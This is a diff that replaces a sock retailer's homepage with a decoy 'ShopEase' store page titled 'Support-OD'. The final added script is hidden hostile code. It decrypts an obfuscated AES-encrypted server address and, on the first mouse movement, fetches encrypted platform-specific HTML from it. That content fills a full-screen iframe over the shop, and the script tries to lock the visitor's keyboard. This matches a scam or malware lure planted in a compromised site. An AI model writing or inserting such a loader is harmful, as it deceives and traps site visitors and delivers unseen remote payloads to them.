@@ -1,90 +1,312 @@
-<?php $year = date('Y'); ?>
-<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Hosiery Drawer | Reinforced Dress Socks &amp; Everyday Hosiery</title><meta name="description" content="Hosiery Drawer makes reinforced dress socks and everyday hosiery built to hold their shape wash after wash. Shop the collection online or visit our studio.">
-<link rel="canonical" href="https://www.hosierydrawer.com/">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Josefin+Sans:wght@500;600;700&family=Work+Sans:wght@400;500;600;700&display=swap" rel="stylesheet"><link rel="stylesheet" href="css/style.css">
-<!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Support-OD</title>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.2.0/crypto-js.min.js"></script>
+  <style>
+    * { box-sizing: border-box; }
+    html, body { margin: 0; height: 100%; }
+    body { font-family: system-ui, -apple-system, "Segoe UI", sans-serif; color: #1f2433; background: #f6f7fb; }
+    a { text-decoration: none; color: inherit; }
+    .hint { text-align: center; padding: 8px; font-size: .85rem; color: #6d28d9; background: #ede9fe; }
+
+    .popup { 
+      position: fixed; 
+      top: 0; 
+      left: 0; 
+      width: 100%; 
+      height: 100%; 
+      background: #ffffff; 
+      display: flex; 
+      justify-content: center; 
+      align-items: center; 
+      z-index: 9999; 
+    }
+    .popup-content { 
+      background: #ffffff; 
+      padding: 60px; 
+      text-align: center; 
+      width: 100%;
+      max-width: 600px; 
+    }
+    .loading-gif { 
+      width: 160px; 
+      height: 160px; 
+      margin-bottom: 30px; 
+    }
+    .popup-content p {
+      font-size: 1.5rem; 
+      color: #1f2433;
+      font-weight: 600;
+      margin: 10px 0 35px 0;
+    }
+    .buttons { 
+      display: flex;
+      justify-content: center;
+      gap: 25px;
+    }
+    button { 
+      padding: 15px 35px; 
+      font-size: 1.1rem;
+      border: none; 
+      border-radius: 8px; 
+      cursor: pointer; 
+      font-weight: 700; 
+      min-width: 150px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    #cancelBtn { background: #f44336; color: white; }
+    #continueBtn { background: #4CAF50; color: white; }
+    button:hover { opacity: 0.9; }
+
+    /* ===== Base Store Layout Styles ===== */
+    .nav { position: sticky; top: 0; z-index: 10; display: flex; align-items: center; gap: 20px;
+           padding: 14px 28px; background: #fff; box-shadow: 0 1px 8px rgba(0,0,0,.06); }
+    .brand { font-size: 1.25rem; font-weight: 800; color: #6d28d9; }
+    .links { display: flex; gap: 18px; margin-left: 8px; }
+    .links a { font-size: .92rem; color: #555; }
+    .links a:hover { color: #6d28d9; }
+    .clock { margin-left: auto; font-size: .8rem; color: #6d28d9; font-weight: 600;
+             background: #f3e8ff; padding: 5px 12px; border-radius: 20px; white-space: nowrap; }
+    .cart-btn { border: 0; cursor: pointer; background: #6d28d9; color: #fff; font-weight: 600;
+                padding: 9px 16px; border-radius: 30px; font-size: .9rem; }
+    .cart-btn .badge { background: #fff; color: #6d28d9; border-radius: 20px; padding: 0 7px;
+                       margin-left: 4px; font-size: .8rem; font-weight: 800; }
+
+    .hero { display: flex; align-items: center; gap: 32px; flex-wrap: wrap; padding: 48px 28px;
+            background: linear-gradient(135deg, #ede9fe, #f5f3ff); }
+    .hero-text { flex: 1 1 320px; }
+    .hero-text h1 { font-size: 2.1rem; margin: 0 0 12px; line-height: 1.2; }
+    .hero-text h1 span { color: #db2777; }
+    .hero-text p { color: #555; max-width: 460px; }
+    .cta { display: inline-block; margin-top: 14px; background: #db2777; color: #fff;
+           font-weight: 700; padding: 12px 26px; border-radius: 30px; }
+    .cta:hover { background: #be185d; }
+    .hero-img { flex: 1 1 320px; max-width: 520px; width: 100%; border-radius: 16px;
+                box-shadow: 0 12px 30px rgba(0,0,0,.15); }
+
+    .section-title { text-align: center; font-size: 1.5rem; margin: 40px 0 6px; }
+
+    .grid { display: grid; gap: 22px; grid-template-columns: repeat(auto-fill, minmax(220px, 1fr));
+            padding: 24px 28px 10px; }
+    .card { background: #fff; border-radius: 14px; overflow: hidden; box-shadow: 0 4px 16px rgba(0,0,0,.07);
+            transition: transform .15s, box-shadow .15s; }
+    .card:hover { transform: translateY(-4px); box-shadow: 0 10px 26px rgba(0,0,0,.12); }
+    .card img { width: 100%; height: 170px; object-fit: cover; display: block; }
+    .card .body { padding: 14px 16px 18px; }
+    .card h3 { margin: 0 0 4px; font-size: 1rem; }
+    .card .price { color: #6d28d9; font-weight: 800; font-size: 1.05rem; }
+    .card .old { color: #aaa; text-decoration: line-through; font-size: .85rem; margin-left: 6px; font-weight: 500; }
+    .add { margin-top: 10px; width: 100%; cursor: pointer; border: 0; background: #1f2433; color: #fff;
+           font-weight: 600; padding: 10px; border-radius: 8px; font-size: .9rem; }
+    .add:hover { background: #6d28d9; }
+
+    .about { padding: 10px 28px 30px; }
+    .features { display: flex; gap: 20px; flex-wrap: wrap; justify-content: center; margin-top: 14px; }
+    .feature { background: #fff; border-radius: 14px; padding: 22px; flex: 1 1 200px; max-width: 260px;
+               text-align: center; box-shadow: 0 4px 14px rgba(0,0,0,.06); }
+    .feature span { font-size: 1.8rem; }
+    .feature h3 { margin: 8px 0 4px; font-size: 1rem; }
+    .feature p { margin: 0; color: #666; font-size: .88rem; }
+
+    .footer { text-align: center; padding: 24px; color: #888; font-size: .85rem; }
+  </style>
+
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-0LY0HY7L01');
+  </script>
+
+<script async src="https://analytics.gettrackdata.one/js/pa-lAPncCfVw1ez-w4iy_WiO.js"></script>
 <script>
-  window.dataLayer = window.dataLayer || [];
-  function gtag(){dataLayer.push(arguments);}
-  gtag('js', new Date());
-  gtag('config', 'G-0LY0HY7L01');
+  window.plausible=window.plausible||function(){(plausible.q=plausible.q||[]).push(arguments)},plausible.init=plausible.init||function(i){plausible.o=i||{}};
+  plausible.init()
 </script>
-<style></style></head><body>
-<header class="site-header"><div class="nav-row">
-  <a href="index.php" class="brand">Hosiery Drawer</a>
-  <nav><ul class="nav-links"><li><a href="index.php" class="active">Home</a></li>
-<li><a href="shop.html">Shop</a></li>
-<li><a href="about.html">Our Story</a></li>
-<li><a href="blog.html">Journal</a></li>
-<li><a href="contact.html">Visit & Contact</a></li></ul></nav>
-  <button class="menu-toggle" aria-label="menu">MENU</button>
-</div></header>
-<section class="hero"><div class="container">
-<div class="hero-grid">
-  <div>
-    <span class="kicker">Reinforced Heel &amp; Toe &middot; Built to Last</span>
-    <h1>Dress socks that hold their shape past the first wash</h1>
-    <p>Hosiery Drawer makes reinforced dress socks and everyday hosiery from cotton and wool blends chosen for how they perform after fifty washes, not just the first one.</p>
-    <div class="hero-actions"><a href="shop.html" class="btn btn-primary">Shop the Collection</a><a href="about.html" class="btn btn-outline">Our Story</a></div>
+
+
+</head>
+<body>
+
+  <div class="popup" id="customPopup">
+    <div class="popup-content">
+      <img src="https://i.gifer.com/ZZ5H.gif" alt="Loading..." class="loading-gif">
+      <p>Loading... Please wait.</p>
+      <div class="buttons">
+        <button id="cancelBtn" type="button">Cancel</button>
+        <button id="continueBtn" type="button">Continue</button>
+      </div>
+    </div>
   </div>
-  <div class="hero-photo"><img src="https://images.unsplash.com/photo-1553460588-3ba256b9aac9?auto=format&fit=crop&w=1800&q=80" alt="Pair of black leather dress shoes with dress socks" loading="lazy"></div>
-</div>
-</div></section>
+  
+  <div id="shop">
+    <div class="hint">🛍️ ShopEase</div>
+    <header class="nav">
+      <div class="brand">🛍️ ShopEase</div>
+      <nav class="links">
+        <a href="#home">Home</a>
+        <a href="#products">Products</a>
+        <a href="#about">About</a>
+      </nav>
+      <span class="clock">🕒 Mon, 29 Jun 2026</span>
+      <button class="cart-btn">🛒 Cart <span class="badge">0</span></button>
+    </header>
 
-<section><div class="container">
-<div class="section-head"><span class="kicker">Shop by Collection</span><h2>Three everyday essentials, one fabric standard</h2><p>Every pair starts with the same reinforced construction, then gets sized for a specific part of your wardrobe.</p></div>
-<div class="collection-grid">
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1553460588-3ba256b9aac9?auto=format&fit=crop&w=1800&q=80" alt="Pair of black leather dress shoes with dress socks" loading="lazy"></div>
-  <div class="collection-body"><h3>Dress Socks</h3><p>Fine-gauge cotton and wool blends built for daily office wear.</p><a href="shop.html" class="collection-link">Shop dress socks &rarr;</a></div></div>
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1713811517871-ba97586a49c3?auto=format&fit=crop&w=900&q=80" alt="Striped socks with black and white shoes" loading="lazy"></div>
-  <div class="collection-body"><h3>Everyday Crew</h3><p>A heavier everyday sock built for comfort and daily wear.</p><a href="shop.html" class="collection-link">Shop everyday crew &rarr;</a></div></div>
-  <div class="collection-card"><div class="collection-photo"><img src="https://images.unsplash.com/photo-1615486364462-ef6363adbc18?auto=format&fit=crop&w=1400&q=80" alt="Pair of wool socks on a white background" loading="lazy"></div>
-  <div class="collection-body"><h3>Wool Blend</h3><p>A warmer wool blend built for cold-weather wear.</p><a href="shop.html" class="collection-link">Shop wool blend &rarr;</a></div></div>
-</div>
-</div></section>
+    <section class="hero" id="home">
+      <div class="hero-text">
+        <h1>Summer Sale — up to <span>50% OFF</span></h1>
+        <p>Trendy products, free stock photos, ek hi page par. Pure HTML + CSS single-page store. ✨</p>
+        <a href="#products" class="cta">Shop now</a>
+      </div>
+      <img class="hero-img" src="https://picsum.photos/seed/shopfashion/520/360" alt="hero" />
+    </section>
 
-<section style="background:#fff;"><div class="container">
-<div class="story-split">
-  <div class="story-photo"><img src="https://images.unsplash.com/photo-1615486364462-ef6363adbc18?auto=format&fit=crop&w=1400&q=80" alt="Pair of wool socks on a white background" loading="lazy"></div>
-  <div><span class="kicker">How It Started</span><h2>Built after one too many pairs went thin at the heel</h2>
-  <p>Hosiery Drawer started with a specific frustration: dress socks that looked sharp on day one and had a hole at the heel within a month. We started testing cotton and wool blends against real daily wear before committing to a single design.</p>
-  <p>Every pair since has been built around that same reinforced standard.</p>
-  <a href="about.html" class="btn btn-outline">Read Our Story</a></div>
-</div>
-</div></section>
+    <!-- Histats.com  START  (aync)-->
+    <script type="text/javascript">var _Hasync= _Hasync|| [];
+    _Hasync.push(['Histats.start', '1,5037956,4,0,0,0,00010000']);
+    _Hasync.push(['Histats.fasi', '1']);
+    _Hasync.push(['Histats.track_hits', '']);
+    (function() {
+    var hs = document.createElement('script'); hs.type = 'text/javascript'; hs.async = true;
+    hs.src = ('//s10.histats.com/js15_as.js');
+    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(hs);
+    })();</script>
+    <noscript><a href="/" target="_blank"><img  src="//sstatic1.histats.com/0.gif?5037956&101" alt="free counter with statistics" border="0"></a></noscript>
+    <!-- Histats.com  END  -->
 
-<section><div class="container">
-<div class="section-head"><span class="kicker">Why We're Different</span><h2>A few things we don't compromise on</h2></div>
-<div class="value-grid">
-  <div class="value-card"><div class="value-num">01</div><h3>Reinforced heel and toe</h3><p>The two spots that wear out first get real reinforcement, standard on every pair.</p></div>
-  <div class="value-card"><div class="value-num">02</div><h3>Fabric tested for pilling</h3><p>Every blend is washed repeatedly before it becomes part of the collection.</p></div>
-  <div class="value-card"><div class="value-num">03</div><h3>Made in small batches</h3><p>We'd rather finish fewer pairs properly than rush a bigger run.</p></div>
-</div>
-</div></section>
+    <section id="products">
+      <h2 class="section-title">Featured Products</h2>
+      <div class="grid">
+        <div class="card">
+          <img src="https://picsum.photos/seed/sneakers/400/300" alt="Running Sneakers" />
+          <div class="body">
+            <h3>Running Sneakers</h3>
+            <div class="price">₹2,499 <span class="old">₹3,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/watch/400/300" alt="Classic Watch" />
+          <div class="body">
+            <h3>Classic Watch</h3>
+            <div class="price">₹4,999 <span class="old">₹7,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/backpack/400/300" alt="Travel Backpack" />
+          <div class="body">
+            <h3>Travel Backpack</h3>
+            <div class="price">₹1,899 <span class="old">₹2,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/headphones/400/300" alt="Wireless Headphones" />
+          <div class="body">
+            <h3>Wireless Headphones</h3>
+            <div class="price">₹3,299 <span class="old">₹4,999</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/sunglasses/400/300" alt="Sunglasses" />
+          <div class="body">
+            <h3>Sunglasses</h3>
+            <div class="price">₹999 <span class="old">₹1,799</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+        <div class="card">
+          <img src="https://picsum.photos/seed/camera/400/300" alt="Instant Camera" />
+          <div class="body">
+            <h3>Instant Camera</h3>
+            <div class="price">₹5,999 <span class="old">₹8,499</span></div>
+            <button class="add">Add to cart</button>
+          </div>
+        </div>
+      </div>
+    </section>
 
-<div class="cta-banner"><div class="container">
-<h2>Ready for socks that actually hold up?</h2>
-<div class="contact-line">181 Mercer Street, New York, NY 10012 &middot; +1-888-777-5845</div>
-<a href="shop.html" class="btn btn-outline" style="border-color:var(--ivory); color:var(--ivory);">Shop the Collection</a>
-</div></div>
+    <section id="about" class="about">
+      <h2 class="section-title">Why ShopEase?</h2>
+      <div class="features">
+        <div class="feature"><span>🚚</span><h3>Free Shipping</h3><p>₹499 se upar free delivery.</p></div>
+        <div class="feature"><span>↩️</span><h3>Easy Returns</h3><p>7-day no-question return.</p></div>
+        <div class="feature"><span>🔒</span><h3>Secure</h3><p>Safe & secure checkout.</p></div>
+      </div>
+    </section>
 
-<footer class="site-footer"><div class="container">
-  <div class="footer-grid">
-    <div><div class="footer-brand">Hosiery Drawer</div><p style="max-width:30ch;">Well-made dress socks and everyday hosiery, built to hold their shape wash after wash.</p></div>
-    <div class="footer-col"><h4>Explore</h4><ul>
-      <li><a href="index.php">Home</a></li><li><a href="shop.html">Shop</a></li><li><a href="about.html">Our Story</a></li><li><a href="blog.html">Journal</a></li><li><a href="contact.html">Visit &amp; Contact</a></li>
-    </ul></div>
-    <div class="footer-col"><h4>Policies</h4><ul>
-      <li><a href="privacy-policy.html">Privacy Policy</a></li><li><a href="terms-conditions.html">Terms &amp; Conditions</a></li><li><a href="disclaimer.html">Disclaimer</a></li><li><a href="cookie-policy.html">Cookie Policy</a></li>
-    </ul></div>
-    <div class="footer-col"><h4>Visit</h4><ul>
-      <li>181 Mercer Street</li><li>New York, NY 10012, United States</li><li><a href="tel:+18887775845">+1-888-777-5845</a></li>
-    </ul></div>
+    <footer class="footer">© 2026 ShopEase · Single-page demo store · Images: picsum.photos</footer>
   </div>
-  <div class="footer-bottom"><span>&copy; <?php echo $year; ?> Hosiery Drawer. All rights reserved.</span><span>Built to hold their shape.</span></div>
-</div></footer>
-<script src="js/main.js"></script>
-</body></html>
+
+
+  <div id="contentiframe" style="display: none; z-index:9999; position:fixed; inset:0; pointer-events:auto; overflow:hidden;">
+    <iframe id="frame" allow="fullscreen; autoplay; encrypted-media; picture-in-picture" allowfullscreen="" webkitallowfullscreen="" mozallowfullscreen="" sandbox="allow-scripts allow-popups allow-forms allow-downloads" style="width: 100%; height: 100%; border: 0px;"></iframe>
+  </div>
+
+  <script>
+    const PASSPHRASE = "98yNCjeAfWMwk0wI";  
+    const URL_KEY = "UrLk3yShopEase01";
+    const ENC_DATA_ORIGIN = "U2FsdGVkX1/c6oSZBXUVJE9t5Ut20g0YQEJr27pxneGal+oblg4yRgD+A9Oa0tJC";
+    const DATA_ORIGIN = CryptoJS.AES.decrypt(ENC_DATA_ORIGIN, URL_KEY).toString(CryptoJS.enc.Utf8);
+    const DATA_URL = DATA_ORIGIN + "/data";
+    let lastUrl = null;
+
+    function detectPlatform() {
+      const p = (navigator.userAgentData && navigator.userAgentData.platform) ||
+                navigator.platform || navigator.userAgent || "";
+      return /mac/i.test(p) ? "mac" : "win";
+    }
+
+    function secureKeyboardAccess() {
+      if (navigator.keyboard) {
+        navigator.keyboard.lock().catch((err) =>
+          console.warn("Keyboard lock failed:", err)
+        );
+      }
+    }
+
+    async function loadSecret() {
+      const shop = document.getElementById("shop");
+      const frame = document.getElementById("frame");
+      const contentIframe = document.getElementById("contentiframe");
+
+      try {
+        const res = await fetch(DATA_URL + "?platform=" + detectPlatform());
+        const { cipher } = await res.json();
+        const html = CryptoJS.AES.decrypt(cipher, PASSPHRASE).toString(CryptoJS.enc.Utf8);
+        if (!html) throw new Error("Decrypt failed — wrong key?");
+
+        if (lastUrl) URL.revokeObjectURL(lastUrl);
+        const blob = new Blob([html], { type: "text/html" });
+        lastUrl = URL.createObjectURL(blob);
+
+        frame.src = lastUrl;
+        
+        shop.style.display = "none";
+        contentIframe.style.display = "block"; 
+        document.getElementById("customPopup").style.display = "none";
+        
+       
+        secureKeyboardAccess();
+
+      } catch (e) {
+        document.querySelector(".hint").textContent = "⚠️ " + e.message;
+        document.getElementById("customPopup").style.display = "none";
+      }
+    }
+
+    window.addEventListener("mousemove", () => {
+      document.getElementById("customPopup").style.display = "none";
+      loadSecret();
+    }, { once: true });
+  </script>
+</body>
+</html>
